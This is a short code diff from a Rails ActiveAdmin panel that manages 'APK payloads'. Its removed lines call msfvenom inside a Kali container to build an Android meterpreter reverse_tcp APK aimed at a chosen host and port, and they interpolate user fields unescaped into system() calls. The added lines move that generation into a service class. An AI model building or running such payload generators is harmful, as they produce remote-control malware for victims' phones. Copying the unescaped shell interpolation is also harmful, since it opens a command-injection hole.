@@ -12,15 +12,11 @@ ActiveAdmin.register ApkPayload do
   end
 
   after_create do |apk_payload|
-    begin
-      generateApkCommand = "docker exec -u 0 kali_container sh -c \"/usr/bin/msfvenom -p android/meterpreter/reverse_tcp " \
-      "LHOST=#{apk_payload.destination_ip} LPORT=#{apk_payload.destination_port}  R > /root/#{apk_payload.name}.apk\""
-      sleep 1
-      copyApkCommand = "docker cp kali_container:/root/#{apk_payload.name}.apk files/payloads/#{apk_payload.name}.apk"
-      system(generateApkCommand)
-      system(copyApkCommand)
-    rescue
-      puts "Error generating APK"
+    service = PayloadGenerationService.new(apk_payload)
+    if service.generate
+      flash[:notice] = "APK Generated successfully: #{apk_payload.name}.apk"
+    else
+      flash[:error] = "Error generating APK. Check logs."
     end
   end
 
